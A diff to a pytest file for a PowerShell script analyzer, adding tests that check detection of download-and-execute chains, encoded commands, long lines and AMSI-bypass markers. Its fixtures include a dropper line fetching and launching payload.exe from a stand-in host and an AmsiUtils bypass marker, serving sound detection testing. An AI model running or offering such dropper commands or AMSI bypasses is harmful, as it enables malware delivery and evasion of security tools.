@@ -130,10 +130,11 @@ async def test_analyze_utf16_powershell_basic_features(tmp_path: Path) -> None:
 @pytest.mark.asyncio
 async def test_download_and_execute_indicator(tmp_path: Path) -> None:
     file_path = tmp_path / "dropper.ps1"
-    file_path.write_text(
+    content = (
         "Invoke-WebRequest https://example.test/payload.exe -OutFile payload.exe\n"
         "Start-Process payload.exe\n"
     )
+    file_path.write_text(content)
 
     analyzer = ScriptAnalyzer()
     result = await analyzer.analyze(file_path, _ctx(file_path))
@@ -141,6 +142,12 @@ async def test_download_and_execute_indicator(tmp_path: Path) -> None:
     indicators = {str(ind["type"]): ind for ind in result.indicators}
     assert "download_and_execute" in indicators
     assert str(indicators["download_and_execute"]["severity"]) == "critical"
+    assert result.features["max_line_length"] == max(len(line) for line in content.splitlines())
+    assert str(result.features["text_preview"]).startswith(
+        "Invoke-WebRequest https://example.test/payload.exe"
+    )
+    heuristic_keys = [heuristic.key for heuristic in result.heuristics]
+    assert "script.download_execute_chain" in heuristic_keys
 
 
 @pytest.mark.asyncio
@@ -203,6 +210,46 @@ async def test_amsi_bypass_indicator(tmp_path: Path) -> None:
     indicators = {str(ind["type"]): ind for ind in result.indicators}
     assert "amsi_bypass" in indicators
     assert str(indicators["amsi_bypass"]["severity"]) == "high"
+    heuristic_keys = [heuristic.key for heuristic in result.heuristics]
+    assert "script.amsi_bypass" in heuristic_keys
+
+
+@pytest.mark.asyncio
+async def test_analyze_emits_encoded_and_long_line_heuristics(tmp_path: Path) -> None:
+    file_path = tmp_path / "encoded-long.ps1"
+    encoded = "SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA=="
+    file_path.write_text(
+        f"powershell -enc {encoded}\n" + ("A" * 620) + "\nStart-Process calc.exe\n"
+    )
+
+    analyzer = ScriptAnalyzer()
+    result = await analyzer.analyze(file_path, _ctx(file_path))
+
+    assert result.features["max_line_length"] == 620
+    encoded_strings = result.features["encoded_strings"]
+    assert isinstance(encoded_strings, list)
+    assert encoded in encoded_strings
+    heuristic_keys = [heuristic.key for heuristic in result.heuristics]
+    assert "script.encoded_command_execution" in heuristic_keys
+    assert "script.long_line_entropy_cluster" in heuristic_keys
+
+
+@pytest.mark.asyncio
+async def test_heuristics_use_full_text_when_marker_falls_beyond_preview_limit(
+    tmp_path: Path,
+) -> None:
+    file_path = tmp_path / "late-amsi.ps1"
+    file_path.write_text(("A" * 1005) + "\nSystem.Management.Automation.AmsiUtils\n")
+
+    analyzer = ScriptAnalyzer()
+    result = await analyzer.analyze(file_path, _ctx(file_path))
+
+    assert len(str(result.features["text_preview"])) == 1000
+    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
+    assert "script.amsi_bypass" in heuristic_map
+    assert heuristic_map["script.amsi_bypass"].evidence["matched_marker"] == (
+        "system.management.automation.amsi"
+    )
 
 
 @pytest.mark.asyncio
